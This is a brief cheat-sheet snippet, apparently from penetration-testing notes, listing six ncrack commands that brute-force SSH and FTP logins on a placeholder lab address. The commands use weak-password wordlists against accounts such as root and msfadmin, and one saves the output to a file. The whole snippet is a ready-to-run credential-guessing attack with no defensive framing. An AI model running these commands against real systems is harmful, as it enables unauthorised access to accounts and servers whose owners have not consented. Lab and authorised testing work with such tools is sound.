!!! info ""

    ```shell
    ncrack -p 22 --user root -P 500-worst-passwords.txt 10.10.10.10
    ncrack -p ssh -u root -P 500-worst-passwords.txt -T5 10.10.10.10
    ncrack -user msfadmin -P pass.txt 10.10.10.10:21
    ncrack -U user.txt -pass msfadmin 10.10.10.10:21
    ncrack -U user.txt -P pass.txt 10.10.10.10:21
    ncrack -U user.txt -P pass.txt 10.10.10.10:21 -oN normal.txt
    ```